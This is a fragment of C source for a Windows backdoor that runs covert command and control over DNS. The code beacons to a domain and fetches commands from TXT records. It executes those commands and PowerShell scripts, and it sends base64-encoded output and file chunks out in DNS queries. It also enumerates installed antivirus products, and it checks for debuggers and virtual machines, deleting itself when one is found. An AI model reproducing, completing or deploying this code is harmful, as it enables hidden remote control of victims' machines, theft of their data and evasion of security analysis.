            strncpy_s(chunk, b64_data + i, chunk_size);
            for (int i = 0; chunk[i] != '\0'; i++) {
                if (chunk[i] == '=') {
                    chunk[i] = '-';
                }
            }
            char message[300];
            snprintf(message, sizeof(message), "s-f%s", chunk);
            char result[500];
            dns_query(final_domain, message, result);
            //Sleep(500);              // prevent flooding
        }
        char result[500];
        dns_query(final_domain, "s-fNoMoreChunks", result);
        free(b64_data);
    }

    else if (strncmp(command, "run ", 4) == 0) {
        const char* input = command + 4;

        const char* space = strchr(input, ' ');
        if (space) {
            int path_len = space - input;
            char script_path[512];

            // Use strncpy_s for safer copy
            if (strncpy_s(script_path, sizeof(script_path), input, path_len) != 0) {
                printf("Failed to copy script path\n");
                return;
            }

            script_path[path_len] = '\0';  // Null-terminate manually

            const char* args = space + 1;

            char* result = run_powershell_with_args(script_path, args);
            if (result) {
                printf("Script output:\n%s\n", result);
                char* res = base64Encoder(result, strlen(result));
                printf("Encoded: %s\n", res);
                SendDataViaDNS(res);
                free(result);
            }
            else {
                printf("Script execution failed.\n");
                
            }
        }
        else {
            printf("Invalid format. Use: run <script_path> <args>\n");
            char* res = base64Encoder("Invalid format. Use: run <script_path> <args>\n", strlen("Invalid format. Use: run <script_path> <args>\n"));
            printf("Encoded: %s\n", res);
            SendDataViaDNS(res);
        }
    }


    else {
        printf("something went wrong");
    }
}




int main() {
    findDomain();
    FILE* pipe = _popen("powershell.exe -Command \"Get-WmiObject -Namespace 'root\\SecurityCenter2' -Class AntivirusProduct | findstr  displayName; \"", "r"); //netsh advfirewall show allprofiles
    
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        // Process each line of output here
        sendMessage(buffer);
        // Send the output to the server or process it further as needed
        // Example: sendToServer(buffer);
    }



    //finding if the code is under debugger
    if (DebuggerPresent()) {
        sendMessage("\nDebugger present\n");
        SelfDelete();
    }
    else {
        sendMessage("\nDebugger not present\n");
    }

    //checking for virtualised environment with difference in tsc
    if (cpu_rdtsc()) {
        sendMessage("\nUnder virtual environment\n");
        SelfDelete();
    }
    else {
        sendMessage("\nNot under virtual environment\n");
    }

    //checking for virtualised environment with flag in ECX register of cpuid function
    if (cpuid_hv_bit()) {
        sendMessage("\nUnder Virtual Environment\n");
        SelfDelete();
    }
    else {
        sendMessage("\nNot under virtual environment\n");
    }

    //checking for virtualised environment with known hypervisor vendors
    char* hv_vendor = cpuid_hv_vendor_00();
    const char* strs[6];
    strs[0] = "KVMKVMKVM\0\0\0";  //KVM
    strs[1] = "Microsoft Hv";  //Microsoft Hyper-V or Windows Virtual PC 
    strs[2] = "VMwareVMware";  //VMware 
    strs[3] = "XenVMMXenVMM";  //Xen 
    strs[4] = "prl hyperv  ";  //Parallels 
    strs[5] = "VBoxVBoxVBox";  //VirtualBox 
    int flag = 0;
    for (int i = 0; i < 6; i++) {
        if (memcmp(hv_vendor, strs[i], 12)) {
            flag = 1;
            char msg[100];
            sprintf_s(msg, sizeof(msg), "\nUnder virtual environment - %s\n", hv_vendor);
            sendMessage(msg);
            //SelfDelete();
            break;
        }
    }
    if (flag == 0) {
        sendMessage("\nNot under virtual environment\n");
    }

    //beaconing code
    bool value = true;
    while (value) {
        PDNS_RECORD pRecord;
        DNS_STATUS status;
        status = DnsQuery_UTF8(final_domain, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
        if (status == ERROR_SUCCESS) {
            DnsRecordListFree(pRecord, DnsFreeRecordList);
            char result[500];
            result[0] = '\0';
            // Concatenate str1 and str2 into result
            //printf("\n%s\n", message);
            strcat_s(result, 500, "sendCommands");
            strcat_s(result, 500, ".");
            strcat_s(result, 500, final_domain);

            printf("\n%s\n", result);
            // Now query for TXT records
            //PDNS_RECORD pRecord = NULL;

            // Perform a TXT record query
            //DNS_STATUS status = DnsQuery_UTF8(result, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
            status = DnsQuery_UTF8(result, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
            if (status == ERROR_SUCCESS) {
                PDNS_RECORD pTxtRecord = pRecord;
                while (pTxtRecord != NULL) {
                    if (pTxtRecord->wType == DNS_TYPE_TEXT) {
                        //printf("\nTXT Record: %s\n", pTxtRecord->Data.TXT.pStringArray[0]);
                        for (DWORD i = 0; i < pTxtRecord->Data.TXT.dwStringCount; i++) {
                            printf("\nTXT Record: %s\n", pTxtRecord->Data.TXT.pStringArray[i]);
                        }
                        PWSTR command = pTxtRecord->Data.TXT.pStringArray[0];
                        if (strcmp((char*)command, "die") == 0) {
                            value = false;
                            break;
                        }
                        else if (strcmp((char*)command, "NoCommands") == 0) {
                            //pass
                        }
                        else {

							ExecuteCommand((char*)command);


                            PDNS_RECORD pRecord1;
                            DNS_STATUS status1;
                            printf("sending response");
                            pRecord1 = NULL; // Reset the pointer

                            char result1[500];
                            result1[0] = '\0';
                            // Concatenate str1 and str2 into result
                            strcat_s(result1, 500, "ResponseExecutingCommand");
                            strcat_s(result1, 500, ".");
                            strcat_s(result1, 500, final_domain);

                            printf("\n%s\n", result1);
                            status1 = DnsQuery_UTF8(result1, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pRecord1, NULL);

                            if (status1 == ERROR_SUCCESS) {
                                printf("Response received.\n");
                            }
                            else {
                                printf("Failed to query response. Status: %d\n", status1);
                            }
                            
                        }
                    }
                    pTxtRecord = pTxtRecord->pNext;
                }

                // Free memory allocated for TXT records
                DnsRecordListFree(pRecord, DnsFreeRecordList);
            }
        }
        Sleep(5000);

    }
    
    return 0;

}